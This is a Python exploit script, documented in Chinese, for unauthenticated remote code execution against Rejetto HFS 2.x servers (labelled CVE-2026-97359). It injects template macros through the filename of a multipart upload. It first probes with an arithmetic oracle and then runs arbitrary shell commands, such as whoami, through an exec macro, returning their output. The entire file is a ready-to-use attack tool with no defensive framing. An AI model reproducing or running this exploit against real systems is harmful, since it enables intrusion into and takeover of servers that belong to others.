#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Rejetto HFS 2.x 未授权 RCE (CVE-2026-97359) 单目标利用器
用法: python3 hfs2_rce.py <ip> <port> ["命令"]
不带命令 = oracle 验活; 带命令 = 执行并回显
"""
import socket, re, sys
B = "X"


def mp(fn):
    return (b"--" + B.encode() + b"\r\n"
            + b'Content-Disposition: form-data; name="f"; filename="' + fn.encode("latin-1") + b'"\r\n'
            + b"Content-Type: application/octet-stream\r\n\r\n" + b"hi" + b"\r\n--" + B.encode() + b"--\r\n")


def knock(host, port, macro, timeout=20):
    bd = mp("%item-resource%:}{" + macro + "}")
    req = (b"POST / HTTP/1.1\r\nHost: " + host.encode() + b":" + str(port).encode()
           + b"\r\nContent-Type: multipart/form-data; boundary=" + B.encode()
           + b"\r\nContent-Length: " + str(len(bd)).encode()
           + b"\r\nConnection: close\r\nUser-Agent: Mozilla/5.0\r\n\r\n" + bd)
    s = socket.create_connection((host, port), timeout=timeout)
    try:
        s.sendall(req)
        buf = b""
        while len(buf) < 400000:
            try:
                c = s.recv(65536)
            except socket.timeout:
                break
            if not c:
                break
            buf += c
        return buf.decode("latin-1", "replace")
    finally:
        s.close()


def namefield(t):
    m = re.search(r'"name"\s*:\s*"((?:[^"\\]|\\.)*)"', t.split("\r\n\r\n", 1)[-1])
    n = (m.group(1) if m else "").replace("\\", "")
    return n.split("&amp;#58;}", 1)[-1].strip()


if __name__ == "__main__":
    host = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
    if len(sys.argv) > 3:
        cmd = sys.argv[3]
        out = namefield(knock(host, port, ".exec|" + cmd + "|timeout=25|out=z.}{.^z."))
        print(f"[{host}:{port}] {cmd} => {out}")
    else:
        t = knock(host, port, ".add|7000000|788.")
        print(f"[{host}:{port}] oracle={'7000788' in t}  (命中=模板注入可求值)")
        if "7000788" in t:
            print(f"[{host}:{port}] whoami => {namefield(knock(host, port, '.exec|whoami|timeout=20|out=z.}{.^z.'))}")
